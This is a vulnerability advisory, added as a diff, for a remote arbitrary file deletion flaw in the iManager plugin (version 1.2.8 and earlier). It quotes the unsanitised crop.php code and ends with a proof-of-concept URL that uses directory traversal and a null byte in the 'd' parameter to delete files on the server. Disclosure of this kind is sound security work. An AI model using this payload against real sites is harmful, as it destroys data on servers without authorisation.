@@ -1,0 +1,54 @@
+iManager Plugin v1.2.8 (d) Remote Arbitrary File Deletion Vulnerability
+
+
+Vendor: net4visions.com
+Product web page: http://www.net4visions.com
+Affected version: <= 1.2.8 Build 02012008
+
+Summary: With iManager you can manage your files/images on your webserver,
+and it provides user interface to most of the phpThumb() functions. It works
+either stand-alone or as a plugin to WYSIWYG editors like tinyMCE, SPAW,
+htmlAREA, Xinha and FCKeditor.
+
+Desc: Input passed to the 'd' parameter in /scripts/phpCrop/crop.php is not
+properly sanitised before being used to delete files. This can be exploited
+to delete files with the permissions of the web server via directory traversal
+sequences passed within the 'd' parameter.
+
+
+======================================================================
+/scripts/phpCrop/crop.php:
+----------------------------------------------------------------------
+
+32: if( isset($_REQUEST['s']) ) {
+33:     //delete previous temp files		
+34:     $matches = glob($d . '{*.jpg,*.JPG}', GLOB_BRACE);		
+35:     if ( is_array ( $matches ) ) {
+36:          foreach ( $matches as $fn) {
+37:               @unlink($fn);	
+38:          }
+39: }
+
+======================================================================
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+
+
+Advisory ID: ZSL-2011-5043
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5043.php
+
+
+15.09.2011
+
+--
+
+
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/imanager/scripts/phpCrop/crop.php?s=1&d=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftest.txt%00
